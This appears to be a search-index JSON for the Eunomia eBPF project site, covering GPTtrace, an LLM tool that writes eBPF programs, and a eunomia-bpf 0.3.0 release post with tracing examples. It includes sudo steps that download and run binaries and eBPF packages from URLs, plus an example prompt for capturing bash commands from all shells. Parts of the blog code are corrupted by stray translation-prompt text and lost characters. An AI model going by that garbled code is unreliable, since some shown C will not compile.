{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Eunomia - Unlock the potential of eBPF","text":"<ul> <li> <p> Unlock the Power of eBPF</p> <p>Explore and enhance the eBPF ecosystem with our open-source tools and frameworks</p> <p> Get started</p> </li> </ul>"},{"location":"#about-eunomia","title":"About Eunomia","text":"<p>Eunomia is an open-source organization dedicated to exploring and enhancing the eBPF ecosystem. Our mission is to innovate and optimize eBPF technologies, enabling developers to build more efficient, extensible, and powerful eBPF applications.</p>"},{"location":"#our-projects","title":"Our Projects","text":""},{"location":"#bpftime","title":"bpftime","text":"<p>bpftime is a high-performance userspace eBPF runtime and General Extension Framework designed for userspace. It allows extending eBPF to various applications as a General Extension Framework, compatible with the current eBPF ecosystem. Enables faster Uprobe, USDT, Syscall hooks, XDP, and more by bypassing the kernel and utilizing an optimized compiler like LLVM.</p> <p>Github  Documentation </p> <p> eBPF Summit 2024 \u00b7   Linux Plumbers Conference 2023 \u00b7   Arxiv</p>"},{"location":"#learn-ebpf-by-examples","title":"Learn eBPF by examples","text":"<p>Too much Concepts? Let's master eBPF through practical, step-by-step tutorials that focus on real, executable examples to help you learn by doing.</p> <p>Github  Tutorial </p>"},{"location":"#llvmbpf","title":"llvmbpf","text":"<p>Userspace eBPF VM with LLVM JIT/AOT compiler. It serves as the core component for bpftime without application, event, or map support.</p> <p>Github  Documentation </p> <p> Blog \u00b7   Arxiv</p>"},{"location":"#wasm-bpf","title":"Wasm-bpf","text":"<p>In cooperation with WasmEdge, we built the first user-space development library, toolchain, and runtime for general eBPF programs based on WebAssembly. This allows lightweight Wasm sandboxes to deploy and control eBPF applications in Kubernetes clusters.</p> <p>Github  Documentation </p> <p> KubeCon North American 2023 \u00b7   Arxiv</p>"},{"location":"#gpttrace","title":"GPTtrace","text":"<p>The first tool to generate eBPF programs and trace the Linux kernel through natural language. With our AI agents, it can produce correct eBPF programs 80% of the time, compared to a GPT-4 baseline of 30%.</p> <p>Github  Documentation </p> <p> eBPF'24 \u00b7   Arxiv</p>"},{"location":"#eunomia-bpf","title":"eunomia-bpf","text":"<p>A tool to help developers build, distribute, and run eBPF programs more easily using JSON and WebAssembly OCI images.</p> <p>Github  Documentation </p> <p> Apsara Conference 2022</p> <p>Share on  Share on </p>"},{"location":"GPTtrace/","title":"GPTtrace \ud83e\udd16","text":"<p>An experiment for generating eBPF programs and tracing with GPT and natural language</p> <p>Want the online version? please see GPTtrace-web for online demo!</p>"},{"location":"GPTtrace/#checkout-our-paper-kgent-kernel-extensions-large-language-model-agent-in-ebpf24","title":"Checkout our paper Kgent: Kernel Extensions Large Language Model Agent in eBPF'24!","text":""},{"location":"GPTtrace/#key-features","title":"Key Features \ud83d\udca1","text":""},{"location":"GPTtrace/#interact-and-tracing-your-linux-with-natural-language","title":"Interact and Tracing your Linux with natural language","text":"<p>example: tracing with Count page faults by process</p> <p></p> <ul> <li>start tracing with natural language</li> <li>let AI explain the result to you</li> </ul>"},{"location":"GPTtrace/#generate-ebpf-programs-with-natural-language","title":"Generate eBPF programs with natural language","text":"<p>example: Write an eBPF program Print entered bash commands from all running shells, save the bpf program to a file and exit without actual run it.</p> <p></p> <p>We use examples from bpftrace tools to create vector store and search.</p> <p>For more detail documents and tutorials about how to write eBPF programs, please refer to:  <code>bpf-developer-tutorial</code> (a libbpf tool tutorial to teach ChatGPT to write eBPF programs)</p>"},{"location":"GPTtrace/#choose-the-right-bcc-command-line-tool-to-complete-the-tracking-task","title":"Choose the right bcc command line tool to complete the tracking task","text":"<p>Use the right bcc tools to trace the kernel</p> <pre><code>$ python3 gpttrace \"Trace allocations and display each individual allocator function call\"\n Run:  sudo memleak-bpfcc --trace \nAttaching to kernel allocators, Ctrl+C to quit.\n(b'Relay(35)', 402, 6, b'd...1', 20299.252425, b'alloc exited, size = 4096, result = ffff8881009cc000')\n(b'Relay(35)', 402, 6, b'd...1', 20299.252425, b'free entered, address = ffff8881009cc000, size = 4096')\n(b'Relay(35)', 402, 6, b'd...1', 20299.252426, b'free entered, address = 588a6f, size = 4096')\n(b'Relay(35)', 402, 6, b'd...1', 20299.252427, b'alloc entered, size = 4096')\n(b'Relay(35)', 402, 6, b'd...1', 20299.252427, b'alloc exited, size = 4096, result = ffff8881009cc000')\n(b'Relay(35)', 402, 6, b'd...1', 20299.252428, b'free entered, address = ffff8881009cc000, size = 4096')\n(b'sudo', 6938, 10, b'd...1', 20299.252437, b'alloc entered, size = 2048')\n(b'sudo', 6938, 10, b'd...1', 20299.252439, b'alloc exited, size = 2048, result = ffff88822e845800')\n(b'node', 410, 18, b'd...1', 20299.252455, b'alloc entered, size = 256')\n(b'node', 410, 18, b'd...1', 20299.252457, b'alloc exited, size = 256, result = ffff8882e9b66400')\n(b'node', 410, 18, b'd...1', 20299.252458, b'alloc entered, size = 2048')\n</code></pre>"},{"location":"GPTtrace/#how-it-works","title":"How it works","text":"<ol> <li>User Input: The user provides their operating system information and kernel version. This information is crucial as it helps to tailor the eBPF program to the specific environment of the user.</li> <li>Prompt Construction: The user's input, along with the OS info and kernel version, is used to construct a prompt. This prompt is designed to guide the generation of the eBPF program.</li> <li>Vector Database Query: The constructed prompt is used to query the Vector Database for eBPF program examples. These examples serve as a basis for generating the eBPF program that will be inserted into the kernel.</li> <li>Hook Point Identification: The GPT API is used to identify potential hook points in the eBPF program. These hook points are locations in the code where the eBPF program can be inseted to monitor or modify the behavior of the kernel.</li> <li>eBPF Program Generation: The identified hook points, along with the examples from the Vector Database, are used to generate the eBPF program. This program is designed to be inserted into the kernel to perform the desired tracing tasks.</li> <li>Kernel Insertion: The generated eBPF program is inserted into the kernel. If there are any errors during this process, the tool will retry the steps from querying the Vector Database to kernel insertion a few times.</li> <li>Result Explanation: Once the eBPF program is successfully inserted into the kernel, the AI will explain the result to the user. This includes an explanation of what the eBPF program is doing and how it is interacting with the kernel.</li> </ol> <p>This process ensures that the eBPF program is tailored to the user's specific environment and needs, and that the user understands how the program works and what it is doing.</p>"},{"location":"GPTtrace/#installation","title":"Installation \ud83d\udd27","text":"<pre><code>pip install gpttrace\n</code></pre>"},{"location":"GPTtrace/#usage-and-setup","title":"Usage and Setup \ud83d\udee0","text":"<pre><code>$ python3 -m gpttrace -h\nusage: GPTtrace [-h] [-c CMD_NAME QUERY] [-v] [-k OPENAI_API_KEY]\n                input_string\n\nUse ChatGPT to write eBPF programs (bpftrace, etc.)\n\npositional arguments:\n  input_string          Your question or request for a bpf program\n\noptions:\n  -h, --help            show this help message and exit\n  -c CMD_NAME QUERY, --cmd CMD_NAME QUERY\n                        Use the bcc tool to complete the trace task\n  -v, --verbose         Show more details\n  -k OPENAI_API_KEY, --key OPENAI_API_KEY\n                        Openai api key, see\n                        `https://platform.openai.com/docs/quickstart/add-\n                        your-api-key` or passed through `OPENAI_API_KEY`\n</code></pre>"},{"location":"GPTtrace/#first-login-to-chatgpt","title":"First: login to ChatGPT","text":"<ul> <li>Access https://platform.openai.com/docs/quickstart/add-your-api-key\uff0cthen create your openai api key as following:</li> </ul> <ul> <li>Remember your key, and then set it to the environment variable <code>OPENAI_API_KEY</code> or use the <code>-k</code> option.</li> </ul>"},{"location":"GPTtrace/#start-your-tracing","title":"start your tracing! \ud83d\ude80","text":"<p>For example:</p> <pre><code>python3 gpttrace \"Count page faults by process\"\n</code></pre> <p>If the eBPF program cannot be loaded into the kernel, The error message will be used to correct ChatGPT, and the result will be printed to the console.</p>"},{"location":"GPTtrace/#examples","title":"Examples","text":"<ul> <li>Files opened by process</li> <li>Syscall count by program</li> <li>Read bytes by process:</li> <li>Read size distribution by process:</li> <li>Show per-second syscall rates:</li> <li>Trace disk size by process</li> <li>Count page faults by process</li> <li>Count LLC cache misses by process name and PID (uses PMCs):</li> <li>Profile user-level stacks at 99 Hertz, for PID 189:</li> <li>Files opened, for processes in the root cgroup-v2</li> </ul>"},{"location":"GPTtrace/#citation","title":"Citation","text":"<pre><code>@inproceedings{10.1145/3672197.3673434,\nauthor = {Zheng, Yusheng and Yang, Yiwei and Chen, Maolin and Quinn, Andrew},\ntitle = {Kgent: Kernel Extensions Large Language Model Agent},\nyear = {2024},\nisbn = {9798400707124},\npublisher = {Association for Computing Machinery},\naddress = {New York, NY, USA},\nurl = {https://doi.org/10.1145/3672197.3673434},\ndoi = {10.1145/3672197.3673434},\nabstract = {The extended Berkeley Packet Filters (eBPF) ecosystem allows for the extension of Linux and Windows kernels, but writing eBPF programs is challenging due to the required knowledge of OS internals and programming limitations enforced by the eBPF verifier. These limitations ensure that only expert kernel developers can extend their kernels, making it difficult for junior sys admins, patch makers, and DevOps personnel to maintain extensions. This paper presents Kgent, an alternative framework that alleviates the difficulty of writing an eBPF program by allowing Kernel Extensions to be written in Natural language. Kgent uses recent advances in large language models (LLMs) to synthesize an eBPF program given a user's English language prompt. To ensure that LLM's output is semantically equivalent to the user's prompt, Kgent employs a combination of LLM-empowered program comprehension, symbolic execution, and a series of feedback loops. Kgent's key novelty is the combination of these techniques. In particular, the system uses symbolic execution in a novel structure that allows it to combine the results of program synthesis and program comprehension and build on the recent success that LLMs have shown for each of these tasks individually.To evaluate Kgent, we develop a new corpus of natural language prompts for eBPF programs. We show that Kgent produces correct eBPF programs on 80\\%---which is an improvement of a factor of 2.67 compared to GPT-4 program synthesis baseline. Moreover, we find that Kgent very rarely synthesizes \"false positive\" eBPF programs--- i.e., eBPF programs that Kgent verifies as correct but manual inspection reveals to be semantically incorrect for the input prompt. The code for Kgent is publicly accessible at https://github.com/eunomia-bpf/KEN.},\nbooktitle = {Proceedings of the ACM SIGCOMM 2024 Workshop on EBPF and Kernel Extensions},\npages = {30\u201336},\nnumpages = {7},\nkeywords = {Large Language Model, Symbolic Execution, eBPF},\nlocation = {Sydney, NSW, Australia},\nseries = {eBPF '24}\n}\n</code></pre>"},{"location":"GPTtrace/#license","title":"LICENSE","text":"<p>MIT</p>"},{"location":"GPTtrace/#links","title":"\ud83d\udd17 Links","text":"<ul> <li>detail documents and tutorials about how we train ChatGPT to write eBPF programs: https://github.com/eunomia-bpf/bpf-developer-tutorial \uff08\u57fa\u4e8e CO-RE (\u4e00\u6b21\u7f16\u5199\uff0c\u5230\u5904\u8fd0\u884c\uff09 libbpf \u7684 eBPF \u5f00\u53d1\u8005\u6559\u7a0b\uff1a\u901a\u8fc7 20 \u4e2a\u5c0f\u5de5\u5177\u4e00\u6b65\u6b65\u5b66\u4e60 eBPF\uff08\u5c1d\u8bd5\u6559\u4f1a ChatGPT \u7f16\u5199 eBPF \u7a0b\u5e8f\uff09</li> <li>bpftrace: https://github.com/iovisor/bpftrace</li> <li>ChatGPT: https://chat.openai.com/</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/","title":"Blog","text":"<p>Share on  Share on </p>"},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/","title":"eunomia-bpf 0.3.0 Release: Easily Build, Package, and Publish Full eBPF Applications by Writing Kernel-Mode Code","text":""},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#introduction-to-eunomia-bpf","title":"Introduction to eunomia-bpf","text":"<p>eBPF, derived from BPF, is an efficient and flexible virtual machine component within the kernel. It executes bytecode at various kernel hook points in a secure manner, enabling developers to build performance analysis tools, software-defined networks, security solutions, and more. However, there are some inconveniences when it comes to developing and using eBPF applications:</p> <ul> <li>Setting up and developing eBPF programs is a complex task. It requires handling interactions and information processing between kernel mode and user mode, as well as configuring the environment and writing corresponding build scripts.</li> <li>Currently, it is difficult to achieve compatibility and unified management among tools written in different user mode languages like C, Go, Rust, etc. There is a challenge in integrating various development ecosystems, such as supporting multiple architectures, languages, and kernel versions. How can we package, distribute, and publish binary eBPF programs in a standardized and convenient way? Additionally, there is a need to easily adjust mounting points, parameters, and other aspects of eBPF programs.</li> <li>How can we make it easier to use eBPF tools? Is it possible to download and use them with just one command from the cloud, similar to Docker? Can we run eBPF programs as services, allowing hot updates and dynamic insertion/removal through HTTP requests and URLs?</li> </ul> <p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain designed to simplify the development, building, distribution, and execution of eBPF programs. It is based on the CO-RE lightweight development framework of libbpf.</p> <p>With eunomia-bpf, you can:</p> <ul> <li>Write only kernel-mode code when developing eBPF programs or tools, and automatically obtain kernel-mode export information.</li> <li>Use Wasm for developing user-mode interactive programs. The Wasm virtual machine controls the loading, execution, and data processing of the entire eBPF program.</li> <li>eunomia-bpf can package pre-compiled eBPF programs into universal JSON or Wasm modules, enabling distribution across architectures and kernel versions without the need for recompilation, and facilitating dynamic loading and execution.</li> </ul> <p>eunomia-bpf consists of a compilation toolchain and a runtime library. Compared to traditional frameworks like BCC and native libbpf, eunomia-bpf greatly simplifies the development process of eBPF programs. In most cases, you only need to write kernel-mode code to easily build, package, and publish complete eBPF applications. The kernel-mode eBPF code ensures 100% compatibility with mainstream development frameworks like libbpf, libbpfgo, libbpf-rs, etc. When you need to write user-mode code, you can use WebAssembly (Wasm) to develop it in multiple languages. Compared to script tools like bpftrace, eunomia-bpf offers similar convenience and is not limited to tracing. It can be used in various scenarios like networking, security, and more.</p> <ul> <li>eunomia-bpf project on Github: https://github.com/eunomia-bpf/eunomia-bpf</li> <li>gitee mirror: https://gitee.com/anolis/eunomia</li> </ul> <p>We have released the latest version 0.3, which optimizes the overall development and usage process. It also supports more types of eBPF programs and maps.</p>"},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#runtime-optimization-enhanced-functionality-multiple-program-types","title":"Runtime Optimization: Enhanced Functionality, Multiple Program Types","text":"<ol> <li> <p>By writing only kernel-mode code, you can obtain corresponding output information and print it in a readable and well-organized manner to the standard output. Let's take the example of a simple eBPF program, opensnoop, which traces all open system calls:</p> <p>Header file opensnoop.h</p> <pre><code>#ifndef __OPENSNOOP_H\n#define __OPENSNOOP_H\n\n#define TASK_COMM_LEN 16\n#define NAME_MAX 255\n#define INVALID_UID ((uid_t)-1)\n\n// used for export event\nstruct event {\n  /* user terminology for pid: */\n  unsigned long long ts;\n  int pid;\n  int uid;\n  int ret;\n  int flags;\n  char comm[TASK_COMM_LEN];\n  char fname[NAME_MAX];\n};\n\n#endif /* __OPENSNOOP_H */\n</code></pre> <p>Kernel-mode code opensnoop.bpf.c</p> <p>```c</p>"},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#include","title":"include \". <p>format: Return only the translated content, not including the original text.```c</p>","text":""},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#include_1","title":"include","text":""},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#include-opensnooph","title":"include \"opensnoop.h\"   <p>struct args_t {   const char *fname;   int flags; };</p> <p>/// Process ID to trace const volatile int pid_target = 0; /// Thread ID to trace const volatile int tgid_target = 0; /// @description User ID to trace const volatile int uid_target = 0; /// @cmdarg {\"default\": false, \"short\": \"f\", \"long\": \"failed\"} const volatile bool targ_failed = false;</p> <p>struct {   __uint(type, BPF_MAP_TYPE_HASH);   __uint(max_entries, 10240);   __type(key, u32);   __type(value, struct args_t); } start SEC(\".maps\");</p> <p>struct {   __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);   __uint(key_size, sizeof(u32));   __uint(value_size, sizeof(u32)); } events SEC(\".maps\");</p> <p>static __always_inline bool valid_uid(uid_t uid) {   return uid != INVALID_UID; }</p> <p>static __always_inline bool trace_allowed(u32 tgid, u32 pid) {   u32 uid;</p> <p>/ filters /   if (tgid_target &amp;&amp; tgid_target != tgid)     return false;   if (pid_target &amp;&amp; pid_target != pid)     return false;   if (valid_uid(uid_target)) {     uid = (u32)bpf_get_current_uid_gid();     if (uid_target != uid) {       return false;     }   }   return true; }</p> <p>SEC(\"tracepoint/syscalls/sys_enter_open\") int tracepoint__syscalls__sys_enter_open(struct trace_event_raw_sys_enter ctx) {   u64 id = bpf_get_current_pid_tgid();   / use kernel terminology here for tgid/pid: */   u32 tgid = id &gt;&gt; 32;   u32 pid = id;</p> <p>/ store arg info for later lookup /   if (trace_allowed(tgid, pid)) {     struct args_t args = {};     args.fname = (const char *)ctx-&gt;args[0];     args.flags = (int)ctx-&gt;args[1];     bpf_map_update_elem(&amp;start, &amp;pid, &amp;args, 0);   }   return 0; }</p> <p>SEC(\"tracepoint/syscalls/sys_enter_openat\") int tracepoint__syscalls__sys_enter_openat(struct trace_event_raw_sys_enter* ctx) { <pre><code>u64 id = bpf_get_current_pid_tgid();\n/* use kernel terminology here for tgid/pid: */\nu32 tgid = id &gt;&gt; 32;\nu32 pid = id;\n\n/* store arg info for later lookup */\nif (trace_allowed(tgid, pid)) {\n  struct args_t args = {};\n  args.fname = (const char *)ctx-&gt;args[1];\n  args.flags = (int)ctx-&gt;args[2];\n  bpf_map_update_elem(&amp;start, &amp;pid, &amp;args, 0);\n}\nreturn 0;\n}\n\nstatic __always_inline\nint trace_exit(struct trace_event_raw_sys_exit* ctx)\n{\n  struct event event = {};\n  struct args_t *ap;\n  int ret;\n  u32 pid = bpf_get_current_pid_tgid();\n\n  ap = bpf_map_lookup_elem(&amp;start, &amp;pid);\n  if (!ap)\n    return 0; /* missed entry */\n  ret = ctx-&gt;ret;\n  if (targ_failed &amp;&amp; ret &gt;= 0)\n    goto cleanup; /* want failed only */\n\n  /* event data */\n  event.pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n  event.uid = bpf_get_current_uid_gid();\n  bpf_get_current_comm(&amp;event.comm, sizeof(event.comm));\n  bpf_probe_read_user_str(&amp;event.fname, sizeof(event.fname), ap-&gt;fname);\n  event.flags = ap-&gt;flags;\n  event.ret = ret;\n\n  /* emit event */\n  bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU,\n            &amp;event, sizeof(event));\n\ncleanup:\n  bpf_map_delete_elem(&amp;start, &amp;pid);\n  return 0;\n}\n\nSEC(\"tracepoint/syscalls/sys_exit_open\")\nint tracepoint__syscalls__sys_exit_open(struct trace_event_raw_sys_exit* ctx)\n{\n  return trace_exit(ctx);\n}\n\nSEC(\"tracepoint/syscalls/sys_exit_openat\")\nint tracepoint__syscalls__sys_exit_openat(struct trace_event_raw_sys_exit* ctx)\n{\n  return trace_exit(ctx);\n}\n\n/// Trace open family syscalls.\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n```\n\nCompile and run:\n\n```console\n$ ecc opensnoop.bpf.c opensnoop.h\nCompiling bpf object...\nGenerating export types...\nPacking ebpf object and config into package.json...\n$ sudo ecli examples/bpftools/opensnoop/package.json\".\n```\n\nCompilation and execution:**Markdown Translation:**\n\n```\nTIME     TS    PID   UID   RET   FLAGS   COMM        FNAME\n20:31:50  0    1     0     51    524288  systemd     /proc/614/cgroup\n20:31:50  0    33182 0     25    524288  ecli        /etc/localtime\n20:31:53  0    754   0     6     0       irqbalance  /proc/interrupts\n20:31:53  0    754   0     6     0       irqbalance  /proc/stat\n20:32:03  0    754   0     6     0       irqbalance  /proc/interrupts\n20:32:03  0    754   0     6     0       irqbalance  /proc/stat\n20:32:03  0    632   0     7     524288  vmtoolsd    /etc/mtab\n20:32:03  0    632   0     9     0       vmtoolsd    /proc/devices\n\n$ sudo ecli examples/bpftools/opensnoop/package.json --pid_target 754\nTIME     TS    PID   UID   RET   FLAGS  COMM        FNAME\n20:34:13  0    754   0     6     0      irqbalance  /proc/interrupts\n20:34:13  0    754   0     6     0      irqbalance  /proc/stat\n20:34:23  0    754   0     6     0      irqbalance  /proc/interrupts\n20:34:23  0    754   0     6     0      irqbalance  /proc/stat\n```\n\nOr compile using Docker:\n\n```shell\ndocker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n```\n\nAfter compiling and publishing, you can easily start any eBPF program from the cloud with a single command, for example:\n\n```bash\nwget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli     # download the release from https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli\nsudo ./ecli https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/package.json # simply run a pre-compiled ebpf code from a url\nsudo ./ecli sigsnoop:latest # run with a name and download the latest version bpf tool from our repo\n```\n\nThe complete code is available here: [https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/opensnoop](https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/opensnoop)\n\n2. Support the automatic generation of user command-line parameters based on comments in the code.\n\nFor example, to implement a PID filter in an eBPF program, you only need to write kernel code and declare a global variable in eBPF to automatically generate command-line parameters:\n\n```c\n/// Process ID to trace\nconst volatile pid_t pid_target = 0;\n/// Thread ID to trace\".\n</code></pre> const volatile pid_t tgid_target = 0; /// @description User ID to trace const volatile uid_t uid_target = 0; /// @cmdarg {\"default\": false, \"short\": \"f\", \"long\": \"failed\"} /// @description target pid to trace const volatile bool targ_failed = false; <pre><code>We will extract the description information of the comments and put it in the configuration file, and convert it into command line arguments for the eBPF application. Take tracing all open system calls with opensnoop as an example:\n\n```console\n$ sudo ecli  examples/bpftools/opensnoop/package.json -h\nUsage: opensnoop_bpf [--help] [--version] [--verbose] [--pid_target VAR] [--tgid_target VAR] [--uid_target VAR] [--failed]\n\nTrace open family syscalls.\n\nOptional arguments:\n  -h, --help    shows help message and exits\n  -v, --version prints version information and exits\n  --verbose     prints libbpf debug information\n  --pid_target  Process ID to trace\n  --tgid_target Thread ID to trace\n\n$ sudo ecli examples/bpftools/opensnoop/package.json --pid_target 754\nTIME     TS      PID     UID     RET     FLAGS   COMM    FNAME\n20:34:13  0      754     0       6       0       irqbalance /proc/interrupts\n20:34:13  0      754     0       6       0       irqbalance /proc/stat\n20:34:23  0      754     0       6       0       irqbalance /proc/interrupts\n20:34:23  0      754     0       6       0       irqbalance /proc/stat\n</code></pre></p> <ol> <li>Support automatically collecting and synthesizing maps that are not ring buffer or perf event, such as hash map, and print out information or generate histograms.</li> </ol> <p>Previously, the use of ring buffer and perf event was slightly limited, so there needs to be a way to automatically collect data from maps by adding comments in the source code:</p> <pre><code>/// @sample {\"interval\": 1000, \"type\" : \"log2_hist\"}\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, MAX_ENTRIES);\n    __type(key, u32);\n    __type(value, struct hist);\n} hists SEC(\".maps\");\n</code></pre> <p>It will collect the contents of counters every second (print_map), using runqlat as an example:</p> <pre><code>$ sudo ecli examples/bpftools/runqlat/package.json -h\nUsage: runqlat_bpf [--help] [--version] [--verbose] [--filter_cg] [--targ_per_process] [--targ_per_thread] [--targ_per_pidns] [--targ_ms] [--targ_tgid VAR]\n```Summarize run queue (scheduler) latency as a histogram.\n\n    Optional arguments:\n      -h, --help            shows help message and exits\n      -v, --version         prints version information and exits\n      --verbose             prints libbpf debug information\n      --filter_cg           set value of bool variable filter_cg\n      --targ_per_process    set value of bool variable targ_per_process\n      --targ_per_thread     set value of bool variable targ_per_thread\n      --targ_per_pidns      set value of bool variable targ_per_pidns\n      --targ_ms             set value of bool variable targ_ms\n      --targ_tgid           set value of pid_t variable targ_tgid\n\n    Built with eunomia-bpf framework.\n    See https://github.com/eunomia-bpf/eunomia-bpf for more information.\n\n    $ sudo ecli examples/bpftools/runqlat/package.json\n    key =  4294967295\n    comm = rcu_preempt\n\n        (unit)              : count    distribution\n            0 -&gt; 1          : 9        |****                                    |\n            2 -&gt; 3          : 6        |**                                      |\n            4 -&gt; 7          : 12       |*****                                   |\n            8 -&gt; 15         : 28       |*************                           |\n           16 -&gt; 31         : 40       |*******************                     |\n           32 -&gt; 63         : 83       |****************************************|\n           64 -&gt; 127        : 57       |***************************             |\n          128 -&gt; 255        : 19       |*********                               |\n          256 -&gt; 511        : 11       |*****                                   |\n          512 -&gt; 1023       : 2        |                                        |\n         1024 -&gt; 2047       : 2        |                                        |\n         2048 -&gt; 4095       : 0        |                                        |\n         4096 -&gt; 8191       : 0        |                                        |\n\n\n\nBuilt with eunomia-bpf framework.\nSee https://github.com/eunomia-bpf/eunomia-bpf for more information.8192 -&gt; 16383      : 0        |                                        |\n        16384 -&gt; 32767      : 1        |                                        |\n\n    $ sudo ecli examples/bpftools/runqlat/package.json --targ_per_process\n    key =  3189\n    comm = cpptools\n\n        (unit)              : count    distribution\n            0 -&gt; 1          : 0        |                                        |\n            2 -&gt; 3          : 0        |                                        |\n            4 -&gt; 7          : 0        |                                        |\n            8 -&gt; 15         : 1        |***                                     |\n           16 -&gt; 31         : 2        |*******                                 |\n           32 -&gt; 63         : 11       |****************************************|\n           64 -&gt; 127        : 8        |*****************************           |\n          128 -&gt; 255        : 3        |**********                              |\n    ```\n\n    Here is the complete code: &lt;https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/runqlat&gt;\n\n4. Add support for multiple types of maps like uprobe, tc, etc., allowing additional attach information to be added using annotations, for example:\n\n    ```c\n\n    /// @tchook {\"ifindex\":1, \"attach_point\":\"BPF_TC_INGRESS\"}\n    /// @tcopts {\"handle\":1,  \"priority\":1}\n    SEC(\"tc\")\n    int tc_ingress(struct __sk_buff *ctx)\n    {\n        void *data_end = (void *)(__u64)ctx-&gt;data_end;\n        void *data = (void *)(__u64)ctx-&gt;data;\n        struct ethhdr *l2;\n        struct iphdr *l3;\n\n        if (ctx-&gt;protocol != bpf_htons(ETH_P_IP))\n            return TC_ACT_OK;\n\n        l2 = data;\n        if ((void *)(l2 + 1) &gt; data_end)\n            return TC_ACT_OK;\n\n        l3 = (struct iphdr *)(l2 + 1);\n        if ((void *)(l3 + 1) &gt; data_end)\n            return TC_ACT_OK;\n\n        bpf_printk(\"Got IP packet: tot_len: %d, ttl: %d\", bpf_ntohs(l3-&gt;tot_len), l3-&gt;ttl);\n        return TC_ACT_OK;\n    }\n    ```\n\n## Regarding compilation: Improved compilation experience, formatting changes\n\n1. Completely refactored the compilation toolchain and configuration file format, returning to the essence of a configuration file + ebpf bytecode .o format. It no longer requires the packaging to be in JSON format, making it more user-friendly for distribution and human editing of configuration files. It also improves compatibility with libbpf-related toolchains.\".2. Support both JSON and YAML formats for configuration files (xxx.skel.yaml and xxx.skel.json), or package them as package.json and package.yaml for distribution;\n3. Use BTF information to express symbol types as much as possible, and hide BTF information in binary files to make configuration files more readable and editable, while reusing the BTF handling mechanism provided by libbpf to improve type handling;\n4. Support more data export types: enum, struct, bool, etc.\n5. Compilation can be done without relying on docker. The binaries and header files can be installed in ~/.eunomia (more friendly to embedded or domestic networks, more convenient to use). The original way of using docker can still be continued;\n6. There is no specific restriction on the file name. It does not have to be xxx.bpf.h and xxx.bpf.c. The files to be compiled in the current directory can be specified through ecc;\n7. Rename the old xxx.bpf.h header file in the example to xxx.h, to be consistent with libbpf-tools and libbpf-bootstrap, and ensure that the libbpf-related code ecosystem can be reused with 0 code modifications;\n8. Greatly optimize compilation speed and reduce compilation dependencies by refactoring the compilation toolchain with Rust, replacing the original Python script.\n\nIn the configuration file, you can directly modify progs/attach to control the mounting point, variables/value to control global variables, maps/data to control the data to be placed in the map when loading the ebpf program, and export_types/members to control the data format to be transmitted to the user space, without the need to recompile the eBPF program. The configuration file and bpf.o binary are complementary and should be used together, or packaged as a package.json/yaml for distribution. When packaging, compression will be applied, and generally the combined size of the compressed configuration file and binary is several tens of kilobytes.\n\nConfiguration file example:\n\n```yaml\nbpf_skel:\n  data_sections:\n  - name: .rodata\n    variables:\n    - name: min_duration_ns\n      type: unsigned long long\n      value: 100\n  maps:\n  - ident: exec_start\n    name: exec_start\n    data:\n      - key: 123\n        value: 456\n  - ident: rb\n    name: rb\n  - ident: rodata\n    mmaped: true\n    name: client_b.rodata\n  obj_name: client_bpf\n  progs:\n  - attach: tp/sched/sched_process_exec\n    link: true\n    name: handle_exec\nexport_types:\n- members:\n  - name: pid\n    type: int\n  - name: ppid\n    type: int\n  - name: comm\n    type: char[16]\n  - name: filename\n    type: char[127]\n  - name: exit_event\n    type: bool\n  name: event\n  type_id: 613\n</code></pre>","text":""},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#download-and-install-eunomia-bpf","title":"Download and install eunomia-bpf","text":"<ul> <li> <p>Install the <code>ecli</code> tool for running eBPF programs from the cloud:</p> <pre><code>$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n$ ./ecli -h\nUsage: ecli [--help] [--version] [--json] [--no-cache] url-and-args\n....\n</code></pre> </li> <li> <p>Install the compiler-toolchain for compiling eBPF kernel code to a <code>config</code> file or <code>Wasm</code> module:</p> <p>```console $ wget https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecc &amp;&amp; chmod +x ./ecc $ ./ecc -h eunomia-bpf compiler\"Usage: ecc [OPTIONS]  [EXPORT_EVENT_HEADER] .... .... <p>```</p> <p>or use the docker image for compile:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest # compile with docker. `pwd` should contains *.bpf.c files and *.h files.\n</code></pre>"},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#development-plans","title":"Development Plans","text":"<ol> <li>Collaborate with more community partners and gradually establish a standardized eBPF program format that is packaged and distributed using configuration files or Wasm binary. Achieve the goal of compiling once and running everywhere.</li> <li>Work with the LMP community to improve the distribution and runtime standards for eBPF programs based 